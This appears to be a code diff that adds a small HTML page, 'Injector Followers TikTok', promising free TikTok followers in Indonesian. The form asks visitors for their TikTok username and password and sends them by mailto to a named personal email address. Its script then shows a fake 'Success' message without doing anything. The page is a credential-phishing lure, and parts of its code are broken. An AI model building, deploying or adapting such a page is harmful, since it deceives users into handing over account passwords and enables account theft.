@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Injector Followers</title>
+  <style>
+    /* Style the page */
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .header {
+      background-color: #337ab7;
+      color: #fff;
+      padding: 10px;
+      border-radius: 10px 10px 0 0;
+    }
+    .header h1 {
+      margin: 0;
+    }
+    .form {
+      padding: 20px;
+    }
+    .form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+    }
+    .form button {
+      background-color: #337ab7;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .form button:hover {
+      background-color: #23527c;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Injector Followers TikTok</h1>
+    </div>
+    <div class="form">
+       <form action="mailto:farhanrisqi17@gmail.com" method="post" enctype="text/plain">
+      <input type="text" id="username" placeholder="@Masukkan Nama TikTok">
+      <input type="text" id="email" placeholder="Masukkan Password TikTok">
+      <button id="submit">Ambil Followers</button>
+    </div>
+  </div>
+
+  <script>
+    // JavaScript code to handle form submission
+    const form = document.querySelector('.form');
+    const usernameInput = document.querySelector('#username');
+    const submitButton = document.querySelector('#submit');
+    const resultParagraph = document.querySelector('#result');
+
+    submitButton.addEventListener('click', async () => {
+      const username = usernameInput.value.trim();
+      if (username === '') {
+        resultParagraph.textContent = 'Please enter your TikTok username';
+        return;
+      }
+
+      // TO DO: Implement API call to increase followers
+      // For demonstration purposes, we'll just display a success message
+      resultParagraph.textContent = `Success! Your followers have been increased.`;
+
+      // Reset the form
+      usernameInput.value = '';
+    });
+  </script>
+</body>
+</html>
